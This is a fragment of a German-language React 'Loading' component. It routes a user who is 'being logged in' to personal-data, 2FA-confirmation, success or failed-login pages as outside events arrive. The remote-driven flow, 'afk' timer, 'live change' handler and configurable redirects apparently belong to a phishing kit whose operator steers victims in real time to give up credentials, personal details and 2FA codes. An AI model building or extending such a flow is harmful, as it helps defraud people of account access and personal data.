...
const Loading = () => {
  ...
  const [text, setText] = useState("Sie werden eingeloggt.");

  const goTo = (override?: string) => {
    const target = override || getSettings().redirects.afterLoading || "/persoenliche-daten";
  ...
  useFlowStep({
    phase: "loading",
    afkNext: () => setTimeout(() => navigate("/persoenliche-daten"), 800),
    onSuccess: () => navigate("/success"),
    onTwofa: () => navigate("/confirm"),
    onLoginFailed: () => {
      setStoredSession(null);
      sessionStorage.removeItem("afk_login_attempts");
      sessionStorage.setItem("login_error", "Anmeldung fehlgeschlagen");
      navigate("/homepage");
    },
    onLiveChange: () => navigate("/persoenliche-daten"),
  });

  // Legacy external hook
  useEffect(() => {
  ...
  useEffect(() => {
    const t = setTimeout(() => setText("Bitte warten."), 3000);
